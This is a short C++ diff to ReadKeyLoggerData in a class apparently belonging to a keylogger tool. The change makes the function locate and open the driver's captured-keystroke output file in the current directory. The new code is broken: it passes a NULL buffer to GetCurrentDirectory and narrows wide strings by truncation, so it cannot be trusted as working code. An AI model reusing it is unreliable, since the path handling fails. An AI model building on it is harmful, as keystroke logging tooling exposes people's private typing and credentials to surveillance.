@@ -72,9 +72,28 @@ DWORD CAnalyzer::StartAnalyzer(ST_PROPER_WORD_RET &refstProperWordRet)
 DWORD CAnalyzer::ReadKeyLoggerData(std::string &refstrSearchWord)
 {
 	FILE *pFile = NULL;
+
+	LPWSTR lpwBuffer = NULL;
+	GetCurrentDirectory(512, lpwBuffer);
+	std::wstring strBuffer = lpwBuffer;
+	std::wstring strFileName = DRIVER_OUTPUT_FILE_NAME;
+	strBuffer += L"/" + strFileName;
+
+	/*
+		check whether file exist on file path indicated	
+	*/
+	BOOL bRet;
+	bRet = PathFileExists(strBuffer.c_str());
+	if (!bRet) {
+		return E_RET_FAIL;
+	}
+
+	std::string strFileFullPath;
+	strFileFullPath.assign(strBuffer.begin(), strBuffer.end());
 #ifdef WIN32
+	
 	errno_t errRet;
-	errRet = ::fopen_s(&pFile, FILE_LOGGER_PATH, "r");
+	errRet = ::fopen_s(&pFile, strFileFullPath.c_str(), "r");
 	if (errRet != 0) {
 		return E_RET_FAIL;
 	}
